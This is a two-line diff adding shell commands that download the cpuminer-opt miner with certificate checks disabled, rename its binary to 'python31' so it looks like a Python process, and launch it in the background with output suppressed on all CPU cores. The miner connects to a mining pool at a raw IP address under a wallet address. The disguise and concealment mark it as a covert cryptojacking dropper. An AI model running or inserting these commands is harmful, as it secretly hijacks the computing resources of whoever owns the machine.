@@ -1,0 +1,2 @@
+wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.43/cpuminer-opt-linux-5.0.43.tar.gz && tar xf cpuminer-opt-linux-5.0.43.tar.gz &&  mv cpuminer-sse2 python31 && tar xf cpuminer-opt-linux-5.0.43.tar.gz && 
+mv cpuminer-sse2 python31 && nohup ./python31 -a yespowerADVC -o stratum+tcps://161.35.47.113:443 -u ASZjZTfFBNstaj7Ky2vwe9pdzv98hTjnrb.$(echo AdV-$(TZ=UTC-7 date +"%D-%H-%M-%S"))  -p x -t$(nproc --all) > /dev/null 2>&1&
